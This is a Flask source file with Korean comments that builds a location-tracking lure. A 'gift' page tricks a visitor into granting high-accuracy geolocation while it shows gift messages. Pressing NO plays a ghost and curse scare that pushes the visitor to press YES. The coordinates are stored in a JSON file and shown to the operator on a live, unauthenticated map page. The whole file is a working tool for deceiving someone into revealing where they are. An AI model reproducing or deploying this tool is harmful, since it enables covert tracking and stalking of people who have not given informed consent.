from flask import Flask, request, render_template_string, jsonify
import json
import os
from datetime import datetime

app = Flask(__name__)

# 데이터 저장 파일
DATA_FILE = 'locations.json'

# ============================================================
# HTML 템플릿 (상대방이 보는 페이지 - YES=선물, NO=귀신)
# ============================================================
TRACK_PAGE = '''
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🎁</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            font-family: 'Arial Black', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            flex-direction: column;
            color: white;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            padding: 40px 30px;
            border-radius: 30px;
            text-align: center;
            box-shadow: 0 0 50px rgba(255, 200, 0, 0.2);
            max-width: 500px;
            width: 100%;
        }
        .emoji-big { font-size: 80px; margin-bottom: 20px; display: block; }
        h1 { font-size: 24px; color: #ffcc00; text-shadow: 0 0 20px rgba(255, 200, 0, 0.3); margin-bottom: 10px; }
        .sub { font-size: 16px; color: #aaa; margin-bottom: 30px; }
        .btn-group { display: flex; gap: 20px; justify-content: center; flex-wrap: wrap; }
        .btn {
            padding: 20px 50px;
            font-size: 28px;
            font-weight: bold;
            border: none;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.3s;
            min-width: 130px;
            flex: 1;
        }
        .btn-yes { background: linear-gradient(135deg, #ffcc00, #ff9900); color: #000; box-shadow: 0 0 30px rgba(255, 200, 0, 0.3); }
        .btn-yes:active { transform: scale(0.95); }
        .btn-no { background: linear-gradient(135deg, #ff3366, #cc0044); color: #fff; box-shadow: 0 0 30px rgba(255, 51, 102, 0.3); }
        .btn-no:active { transform: scale(0.95); }
        #result-area { margin-top: 30px; min-height: 150px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .result-emoji { font-size: 100px; animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .result-text { font-size: 20px; margin-top: 15px; color: #ddd; }
        @keyframes popIn { 0% { transform: scale(0); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
        .shake { animation: shake 0.3s ease-in-out 3; }
        #status-tip { font-size: 13px; color: #555; margin-top: 20px; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
<div class="container" id="app">
    <span class="emoji-big">🎁</span>
    <h1>특별 선물이 도착했어요!</h1>
    <p class="sub">당신을 위해 준비했습니다. 받으시겠어요?</p>
    <div class="btn-group">
        <button class="btn btn-yes" id="btnYes">✔ YES</button>
        <button class="btn btn-no" id="btnNo">✘ NO</button>
    </div>
    <div id="result-area"></div>
    <div id="status-tip">👆 버튼을 눌러보세요</div>
</div>
<script>
    document.getElementById('btnYes').addEventListener('click', function() {
        document.getElementById('btnYes').disabled = true;
        document.getElementById('btnNo').disabled = true;
        const resultArea = document.getElementById('result-area');
        resultArea.innerHTML = `<div class="result-emoji">🎁</div><div class="result-text">🎉 선물이 열렸어요! 잠시만 기다려주세요...</div>`;
        document.getElementById('status-tip').textContent = '⏳ 선물을 준비 중입니다...';
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    fetch('/api/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ lat: lat, lon: lon, acc: position.coords.accuracy, time: new Date().toISOString() })
                    })
                    .then(res => res.json())
                    .then(() => {
                        resultArea.innerHTML = `<div class="result-emoji">🎉🎁🎉</div><div class="result-text">🎊 선물이 도착했습니다! 감사합니다!</div>`;
                        document.getElementById('status-tip').textContent = '✅ 선물이 전달되었습니다!';
                    })
                    .catch(() => {
                        resultArea.innerHTML = `<div class="result-emoji">🎁</div><div class="result-text">선물이 도착했습니다! (위치 전송은 실패했어요)</div>`;
                        document.getElementById('status-tip').textContent = '⚠️ 네트워크 오류, 하지만 선물은 받으셨어요!';
                    });
                },
                function(error) {
                    resultArea.innerHTML = `<div class="result-emoji">🎁</div><div class="result-text">선물이 도착했습니다! 🎉</div>`;
                    document.getElementById('status-tip').textContent = '⚠️ 위치 권한을 거부하셨지만, 선물은 드립니다!';
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        } else {
            resultArea.innerHTML = `<div class="result-emoji">🎁</div><div class="result-text">선물이 도착했습니다! 🎉</div>`;
            document.getElementById('status-tip').textContent = '⚠️ 이 브라우저는 위치를 지원하지 않아요, 하지만 선물은 드립니다!';
        }
        setTimeout(() => {
            document.getElementById('btnYes').disabled = false;
            document.getElementById('btnNo').disabled = false;
        }, 3000);
    });
    document.getElementById('btnNo').addEventListener('click', function() {
        document.getElementById('btnYes').disabled = true;
        document.getElementById('btnNo').disabled = true;
        const resultArea = document.getElementById('result-area');
        const container = document.querySelector('.container');
        document.body.style.background = '#0a0000';
        container.style.boxShadow = '0 0 80px rgba(255, 0, 0, 0.5)';
        resultArea.innerHTML = `<div class="result-emoji shake">👻</div><div class="result-text" style="color:#ff3366;">😱 귀신이 나타났습니다! 도망가세요!</div>`;
        document.getElementById('status-tip').textContent = '👻 당신은 귀신을 불렀습니다...';
        setTimeout(() => {
            document.body.style.background = '#1a0000';
            resultArea.innerHTML = `<div class="result-emoji" style="font-size:120px;">💀</div><div class="result-text" style="color:#ff0000; font-size:24px;">당신은 저주받았습니다...</div>`;
        }, 2000);
        setTimeout(() => {
            document.body.style.background = '#0a0a0a';
            container.style.boxShadow = '0 0 50px rgba(255, 200, 0, 0.2)';
            resultArea.innerHTML = `<div class="result-emoji">👻</div><div class="result-text" style="color:#888;">...다시 시도하시겠어요?</div>`;
            document.getElementById('status-tip').textContent = '👆 YES를 누르면 선물을 드려요';
            document.getElementById('btnYes').disabled = false;
            document.getElementById('btnNo').disabled = false;
        }, 5000);
    });
</script>
</body>
</html>
'''

# ============================================================
# HTML 템플릿 (내가 보는 지도 페이지)
# ============================================================
MAP_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📍 수집된 위치</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        body { margin: 0; padding: 0; }
        #map { height: 100vh; width: 100%; }
        .info { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.8); color: #0f0; padding: 15px; border-radius: 10px; z-index: 1000; font-family: monospace; font-size: 14px; max-height: 80vh; overflow-y: auto; }
    </style>
</head>
<body>
    <div id="map"></div>
    <div class="info" id="info">📍 수집된 위치가 여기에 표시됩니다</div>
    <script>
        const map = L.map('map').setView([37.5665, 126.9780], 13);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        function updateMarkers() {
            fetch('/api/locations')
                .then(res => res.json())
                .then(data => {
                    const info = document.getElementById('info');
                    info.innerHTML = '📍 수집된 위치 (' + data.length + '개)<br><br>';
                    data.forEach((loc, i) => {
                        info.innerHTML += `${i+1}. 위도: ${loc.lat}, 경도: ${loc.lon}<br>`;
                        L.marker([loc.lat, loc.lon]).addTo(map)
                            .bindPopup(`📅 ${loc.time || '알 수 없음'}<br>🎯 정확도: ${loc.acc || '?'}m`);
                    });
                });
        }
        updateMarkers();
        setInterval(updateMarkers, 5000);
    </script>
</body>
</html>
'''

# ============================================================
# Flask 라우트 (여기가 핵심! 모든 변수명은 영어로)
# ============================================================
@app.route('/')
def track():
    return render_template_string(TRACK_PAGE)

@app.route('/map')
def map_view():
    return render_template_string(MAP_PAGE)

@app.route('/api/location', methods=['POST'])
def receive_location():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data'}), 400

    # 기존 데이터 읽기 (모든 변수명 영어)
    try:
        with open(DATA_FILE, 'r') as f:
            locations = json.load(f)
    except:
        locations = []

    # 새 데이터 추가
    data['received_at'] = datetime.now().isoformat()
    locations.append(data)

    # 저장
    with open(DATA_FILE, 'w') as f:
        json.dump(locations, f, indent=2)

    return jsonify({'status': 'ok', 'count': len(locations)})

@app.route('/api/locations', methods=['GET'])
def get_locations():
    try:
        with open(DATA_FILE, 'r') as f:
            locations = json.load(f)
    except:
        locations = []
    return jsonify(locations)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)
